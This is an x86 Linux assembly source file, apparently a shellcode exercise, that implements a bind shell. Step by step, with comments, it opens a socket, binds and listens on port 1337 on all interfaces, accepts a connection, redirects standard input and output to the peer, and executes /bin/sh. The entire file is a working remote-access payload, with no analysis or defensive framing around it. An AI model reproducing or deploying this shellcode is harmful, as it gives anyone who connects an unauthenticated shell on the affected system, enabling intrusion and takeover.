
;---------------------------------
;
; Author: Michael Dubell
; 
; Purpose:
; Start a bind shell on port 1337
; On connection, execute /bin/sh
;
;----------------------------------

global _start

section .text
_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket
    
    ; socketcall()
    mov al, 0x66     ; __NR_socketcall 102
    mov bl, 0x1      ; SYS_SOCKET

    ; # Setup socket
    ; Resulting file descriptor is saved to eax
    push edx
    push 0x1
    push 0x2
    mov ecx, esp     ; Arguments are located top of the stack
    int 0x80         ; Tell the kernel it's time to boogie
    mov edi, eax     ; $eax contains the file descriptor created by socket(), store it in $edi for now

    ; ---------------------------------
    ; # Setup bind
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x2      ; SYS_BIND 

    ; setup sockaddr struct
    push edx         ; Listen on 0.0.0.0
    push word 0x3905 ; htons(1337)
    push word 0x2    ; AF_INET

    mov ecx, esp     ; Store the address that points to our struct
    
    ; Push the arguments for bind()
    push 0x10        ; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
    push ecx         ; Points to our sockaddr_in struct
    push edi         ; Contains our file descriptor

    mov ecx, esp     ; Second parameter for socketcall, points to arguments required by bind()
    int 0x80         ; Tell the kernel let's go!
    
    ; --------------------
    ; # Setup listen
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x4      ; SYS_LISTEN

    push 0x2         ; backlog, hold 2 connections in queue
    push edi         ; Our file descriptor
    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_LISTEN
    int 0x80         ; Instruct the kernel to run our syscall

    ; --------------------
    ; # Setup accept
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x5      ; SYS_ACCEPT

    ; Setup accept
    push edx         ; 0x0
    push edx         ; 0x0
    push edi         ; Our file descriptor

    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_ACCEPT

    int 0x80         ; Execute
    mov edi, eax     ; $eax stores the peer's file descriptor, save it to edi

    ; --------------------
    ; # Setup dup2
    ; redirect to stdin
    mov al, 0x3f     ; syscall number dup2 63 --> 0x3f
    mov ebx, edi     ; peer's file descriptor
    mov ecx, edx     ; STDIN
    int 0x80

    ; redirect to stdout
    mov al, 0x3f
    mov cl, 0x1      ; STDOUT
    int 0x80

    ; redirect to stderr
    mov al, 0x3f
    mov cl, 0x2      ; STDERR
    int 0x80

    ; --------------------
    ; # Setup execv
    xor edx, edx
    push edx
    
    ; push //bin/sh onto the stack
    push 0x68732f6e
    push 0x69622f2f  

    ; Set address of esp to ebx, which points
    ; to //bin/sh
    mov ebx, esp
    
    xor ecx, ecx
    xor eax, eax
    mov al, 0xb      ; execv syscall
    int 0x80

    ; -----------------------------
    ; THE END - HAVE A NICE SHELL |
    ; -----------------------------


